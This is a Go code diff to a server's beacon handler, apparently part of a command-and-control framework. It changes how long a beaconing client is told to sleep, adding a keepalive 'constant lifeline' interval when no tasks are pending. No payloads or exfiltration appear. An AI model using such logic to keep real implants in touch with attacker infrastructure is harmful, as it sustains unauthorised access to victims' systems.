@@ -288,14 +288,21 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	tasks := s.getPendingTasks(sessionID)
 	s.logger.Debug("Returning %d pending tasks for session %s", len(tasks), sessionID)
 
-	// Calculate adaptive sleep interval
+	// Calculate adaptive sleep interval with constant lifeline
 	// If there are pending tasks, use shorter interval (1-2 seconds)
-	// Otherwise use configured sleep interval
-	adaptiveSleep := s.config.Communication.Sleep.Seconds()
+	// Otherwise use minimum keepalive interval to maintain constant lifeline
+	adaptiveSleep := s.config.Communication.KeepAliveInterval.Seconds()
+	if adaptiveSleep == 0 {
+		// Fallback to Sleep if KeepAliveInterval not set
+		adaptiveSleep = s.config.Communication.Sleep.Seconds()
+	}
 	if len(tasks) > 0 {
 		// Active tasking - use fast interval (1-2 seconds with jitter)
 		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
 		s.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
+	} else {
+		// No tasks - use keepalive interval to maintain constant lifeline
+		s.logger.Debug("Adaptive sleep: no tasks, using keepalive interval %.2fs for constant lifeline", adaptiveSleep)
 	}
 
 	response := map[string]interface{}{
